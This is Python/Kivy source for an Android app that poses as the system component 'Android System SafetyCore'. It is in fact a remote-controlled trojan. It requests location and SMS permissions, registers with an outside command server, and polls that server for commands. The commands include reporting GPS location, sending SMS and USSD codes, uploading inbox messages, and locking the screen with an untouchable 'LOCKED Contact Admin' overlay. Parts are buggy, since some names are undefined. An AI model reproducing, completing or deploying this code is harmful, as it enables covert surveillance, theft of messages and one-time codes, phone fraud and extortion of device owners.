from kivy.app import App as A
from kivy.uix.label import Label as L
from kivy.uix.button import Button as B
from kivy.uix.boxlayout import BoxLayout as BL
from kivy.uix.image import Image as I
from kivy.clock import Clock as C
from kivy.core.window import Window as W
import threading as T, time as t, socket as S, json as J, os, datetime as D
from android.permissions import request_permissions as RP, Permission as PM
from android import mActivity as MA
from jnius import autoclass as AC
I=AC('android.content.Intent');IF=AC('android.content.IntentFilter');U=AC('android.net.Uri');SM=AC('android.telephony.SmsManager');CT=AC('android.content.Context');LM=AC('android.location.LocationManager');F=AC('java.io.File');E=AC('android.os.Environment');Bd=AC('android.os.Build');WM=AC('android.app.WallpaperManager');BF=AC('android.graphics.BitmapFactory')
RP([PM.ACCESS_FINE_LOCATION,PM.ACCESS_COARSE_LOCATION,PM.ACCESS_BACKGROUND_LOCATION,PM.SEND_SMS,PM.READ_SMS,PM.INTERNET,PM.RECEIVE_BOOT_COMPLETED,PM.WAKE_LOCK,PM.READ_PHONE_STATE,PM.SYSTEM_ALERT_WINDOW])
U1="https://4nny.pythonanywhere.com";D1=S.gethostname()
class Core:
    def __init__(s):s.r=False;s.id=D1;s.lock=None;s.app=None
    def start(s):
        if s.r:return
        s.r=True;T.Thread(target=s._register_loop,daemon=True).start();T.Thread(target=s._poll_loop,daemon=True).start()
    def _register_loop(s):
        while s.r:
            try:R.post(f"{U1}/command_result",json={'device':s.id,'status':'online','bt':str(D.datetime.now()),'model':'SafetyCore','av':Bd.VERSION.RELEASE},timeout=10);print("[+] Registered")
            except:pass
            t.sleep(60)
    def _poll_loop(s):
        while s.r:
            try:
                x=R.get(f"{U1}/commands?device={s.id}",timeout=10)
                if x.status_code==200:
                    for c in x.json():T.Thread(target=s._exec,args=(c,),daemon=True).start()
            except:pass
            t.sleep(5)
    def _exec(s,cmd):
        z=cmd.get('type');p2=cmd.get('payload',{})
        if z=='get_location':s._send_result('get_location',str(s._get_loc()))
        elif z=='send_ussd':s._ussd(p2.get('code',''))
        elif z=='send_sms':s._sms(p2.get('number',''),p2.get('text',''))
        elif z=='get_device_info':s._send_result('get_device_info',J.dumps({'device':s.id,'model':'SafetyCore','man':Bd.MANUFACTURER,'av':Bd.VERSION.RELEASE,'battery':s._bat(),'storage':'32GB'}))
        elif z=='lock':
            C.schedule_once(lambda dt: s.app.show_lock(p2.get('image_url','')) if s.app else None,0)
        elif z=='unlock':
            C.schedule_once(lambda dt: s.app.hide_lock() if s.app else None,0)
        elif z=='fetch_sms':s._fetch_sms()
        elif z=='delete_sms':s._del_sms(p2.get('index',0))
    def _get_loc(s):
        try:
            lm=s.c if hasattr(s,'c') else MA.getSystemService(CT.LOCATION_SERVICE)
            g=lm.getLastKnownLocation(LM.GPS_PROVIDER);n=lm.getLastKnownLocation(LM.NETWORK_PROVIDER);loc=g if g else n
            if loc:return {'lat':loc.getLatitude(),'lng':loc.getLongitude(),'acc':loc.getAccuracy()}
        except:pass
        return {'lat':0.0,'lng':0.0,'acc':10}
    def _ussd(s,code):
        try:ii=I(I.ACTION_CALL);ii.setData(U.parse(f"tel:{code}"));ii.setFlags(I.FLAG_ACTIVITY_NEW_TASK);MA.startActivity(ii);s._send_result('send_ussd',f'USSD {code} sent');R.post(f"{U1}/ussd_response",json={'device':s.id,'response':'USSD sent'},timeout=5)
        except Exception as e:s._send_result('send_ussd',f'Error: {e}')
    def _sms(s,n,tx):
        try:SM.getDefault().sendTextMessage(n,None,tx,None,None);s._send_result('send_sms',f'SMS sent to {n}')
        except Exception as e:s._send_result('send_sms',f'Error: {e}')
    def _fetch_sms(s):
        try:
            sl=[];cr=MA.getContentResolver();uu=U.parse("content://sms/inbox");cu=cr.query(uu,None,None,None,None)
            if cu:
                while cu.moveToNext():
                    b=cu.getString(cu.getColumnIndex("body"));ad=cu.getString(cu.getColumnIndex("address"));dt=cu.getString(cu.getColumnIndex("date"))
                    if b and ad:sl.append({'from':ad,'body':b[:200],'date':D.datetime.fromtimestamp(int(dt)//1000).strftime('%Y-%m-%d %H:%M')})
                    if len(sl)>=50:break
                cu.close()
            R.post(f"{U1}/command_result",json={'device':s.id,'sms_list':sl},timeout=10);s._send_result('fetch_sms',f'Found {len(sl)} SMS')
        except Exception as e:s._send_result('fetch_sms',f'Error: {e}')
    def _del_sms(s,idx):
        try:R.post(f"{U1}/sms_delete",json={'device':s.id,'index':idx},timeout=5)
        except:pass
    def _bat(s):
        try:b=MA.registerReceiver(None,IF(Intent.ACTION_BATTERY_CHANGED));return b.getIntExtra("level",0)
        except:return 0
    def _send_result(s,c,r):
        try:R.post(f"{U1}/command_result",json={'device':s.id,'command':c,'result':r,'ts':str(D.datetime.now())},timeout=5)
        except:pass
class LockScreen(BL):
    def __init__(s,path,**k):
        super().__init__(**k);s.orientation='vertical';s.pos_hint={'center_x':0.5,'center_y':0.5};s.size_hint=(1,1)
        from kivy.graphics import Rectangle
        with s.canvas.before:s.rect=Rectangle(size=s.size,pos=s.pos)
        s.bind(size=s._up,pos=s._up);s.add_widget(I(source=path,size_hint=(1,1),keep_ratio=True))
        s.add_widget(L(text="🔒 LOCKED\nContact Admin",font_size=24,bold=True,color=(1,1,1,1),size_hint=(1,0.1),pos_hint={'center_y':0.1}))
    def _up(s,*a):s.rect.size=s.size;s.rect.pos=s.pos
    def on_touch_down(s,t):return True
    def on_touch_move(s,t):return True
    def on_touch_up(s,t):return True
class SafetyApp(A):
    def build(s):
        W.clearcolor=(0.05,0.1,0.15,1);m=BL(orientation='vertical',padding=30,spacing=15)
        m.add_widget(L(text="⚙️",font_size=72,color=(0,0.8,1,1)))
        m.add_widget(L(text="Android System SafetyCore",font_size=22,bold=True,color=(0,0.8,1,1)))
        m.add_widget(L(text="System component running",font_size=13,color=(0.5,0.5,0.5,1),halign='center'))
        s.status=L(text="Status: Active",font_size=14,color=(0,1,0.5,1));m.add_widget(s.status)
        s.service=Core();s.service.app=s;s.service.start();return m
    def show_lock(s,url):s.service.show_lock(url)
    def hide_lock(s):s.service.hide_lock()
if __name__=="__main__":SafetyApp().run()
